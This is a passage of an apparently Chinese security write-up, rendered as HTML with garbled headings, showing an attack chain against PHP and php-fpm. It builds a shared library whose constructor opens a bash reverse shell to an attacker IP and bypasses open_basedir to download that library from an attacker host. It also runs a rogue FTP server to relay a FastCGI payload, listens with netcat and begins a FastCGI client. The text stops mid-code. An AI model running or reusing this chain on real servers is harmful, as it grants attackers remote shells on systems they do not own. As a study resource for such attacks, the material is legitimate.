class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xx.xx.xxx/11451 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>make</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hpdoger.c -fPIC -shared -o hpdoger.so</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è‡³ç›®æ ‡ /tmp ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">copy(<span class="string">&quot;http://vps/hpdoger.so&quot;</span>,<span class="string">&quot;/tmp/hpdoger.so&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç¼–å†™ python è„šæœ¬æ­å»ºæ¶æ„ ftp æœåŠ¡å™¨ï¼š</p><p><code>fuxk.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>åå°è¿è¡Œï¼š<code>python fuxk.py &amp;</code></p><p>ç„¶åå¼€å¯ç›‘å¬ï¼Œæ¥å—åå¼¹ shellï¼š<code>nc -lvp 11451</code></p><p>ç„¶åæ‰§è¡Œä¸€ä¸‹è„šæœ¬ç”Ÿæˆæ”»å‡» php-fpm æ‰€éœ€è¦çš„payloadï¼š</p><p><code>fastcgi.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="built_in">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="keyword">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[substr(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = substr(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span 